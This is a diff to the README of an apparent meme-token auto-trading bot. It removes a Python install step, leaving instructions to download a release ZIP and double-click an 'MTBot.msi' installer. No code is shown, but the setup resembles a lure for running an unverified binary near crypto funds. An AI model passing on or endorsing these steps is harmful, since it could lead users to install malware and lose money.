@@ -104,9 +104,8 @@ Be the first to spot and invest in newly listed tokens. Gain an early-mover adva
 ## Installation Options
 
 ### Easy Installation (Windows)
-1. Download and install [Python 3.12.1](https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe).
-2. Download the repository as a ZIP file [here](https://github.com/AlekAnders/Meme-Token-Auto-Trading-Bot/releases/tag/3.0).
-3. Extract the files and double-click the `MTBot.msi` file to start the bot.
+1. Download the repository as a ZIP file [here](https://github.com/AlekAnders/Meme-Token-Auto-Trading-Bot/releases/tag/3.0).
+2. Extract the files and double-click the `MTBot.msi` file to start the bot.
 
 ### Git and Python Installation for Windows (Recommended)
 1. Download and install [Git](https://git-scm.com/download/).
